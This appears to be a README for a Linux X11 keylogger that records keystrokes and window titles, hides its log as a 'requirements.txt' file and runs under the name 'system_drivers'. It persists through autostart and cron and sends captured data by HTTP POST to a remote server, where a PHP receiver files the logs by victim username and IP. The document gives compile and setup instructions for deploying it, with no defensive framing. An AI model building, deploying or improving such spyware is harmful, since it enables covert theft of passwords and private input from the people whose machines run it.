# Linux X11 Keylogger & Remote Exfiltrator
* This project provides a lightweight implementation of a background keylogger for Linux systems using the X11 windowing system, featuring automatic persistence and periodic data exfiltration to a remote server [3].
# Components
* Client (main.c): A C program that captures active window titles and keystrokes using `libX11`, logging them to `~/Documents/requirements.txt` [3]. It utilizes `libcurl` to transmit the captured data via HTTP POST requests periodically [1]. Upon execution, it ensures system persistence by creating a desktop autostart entry and a `@reboot` cron job [3].
* Server (receiver.php): A PHP script designed to receive incoming POST requests [2]. It extracts the sender's identity and IP address, then appends the payload to uniquely named log files (e.g., `{username}@{ip}-{timestamp}`) inside a `logs/` directory [2].
# Compilation (GCC / Linux)
* To compile and launch the client, you can use the provided shell scripts (`run.sh` or `keylogger.sh`), which verify the `gcc` compiler, compile the code with required libraries, and start the process in the background [1]. The direct compilation command is:
```bash
gcc -o system_drivers main.c -lcurl -lX11 -Wall -Wno-stringop-truncation -Wno-format-truncation
```
# Setup
* Modify the `main.c` file and update the `#define SERVER "kersonik.dev"` definition to point to the domain or IP where your `receiver.php` script is hosted [3].
* Upload `receiver.php` to your web server and ensure the `logs/` directory has appropriate write permissions.
* Once `system_drivers` is executed, it automatically configures persistence via autostart and cron jobs, ensuring it runs on system boot [3]. To stop the background process, use the command `pkill -f system_drivers` [1].
